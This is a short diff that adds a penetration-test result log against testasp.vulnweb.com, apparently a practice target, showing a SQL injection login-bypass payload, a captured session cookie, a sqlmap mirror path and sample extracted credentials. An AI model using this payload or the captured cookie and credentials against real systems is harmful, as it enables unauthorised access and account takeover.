@@ -1,0 +1,9 @@
+================== REPORT OF SUCCESSFUL PENETRATION ==================
+[+] Date: Sat Jun 20 06:59:27 UTC 2026
+[+] Target: http://testasp.vulnweb.com
+[+] Vulnerability: SQL Injection (Authentication Bypass)
+[+] Successful Payload: admin' OR '1'='1'--
+[+] Valid Session Cookie: ASPSESSIONIDACAQRBTA=HOOHCKHCCLMNMDNFBHNMEJGN
+[+] Local Mirror: /root/sqlmap-dev/mirror/testasp.vulnweb.com/
+[+] Extracted Credentials (sample): admin / nessus_was_pass_yu4rft2y
+===================================================================
